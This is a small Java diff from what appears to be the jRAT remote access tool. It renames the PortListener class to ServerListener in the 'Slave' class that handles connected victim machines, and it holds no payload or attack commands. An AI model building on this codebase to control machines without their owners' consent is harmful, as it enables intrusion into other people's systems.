@@ -12,7 +12,7 @@ import javax.crypto.BadPaddingException;
 import se.jrat.client.addons.PluginEventHandler;
 import se.jrat.client.exceptions.CloseException;
 import se.jrat.client.net.ConnectionHandler;
-import se.jrat.client.net.PortListener;
+import se.jrat.client.net.ServerListener;
 import se.jrat.client.packets.incoming.IncomingPackets;
 import se.jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.client.packets.outgoing.Packet0Ping;
@@ -49,7 +49,7 @@ public class Slave extends AbstractSlave {
 	private int ram = 0;
 	private short processors;
 
-	public Slave(PortListener connection, Socket socket) {
+	public Slave(ServerListener connection, Socket socket) {
 		super(connection, socket);
 		new Thread(this).start();
 	}
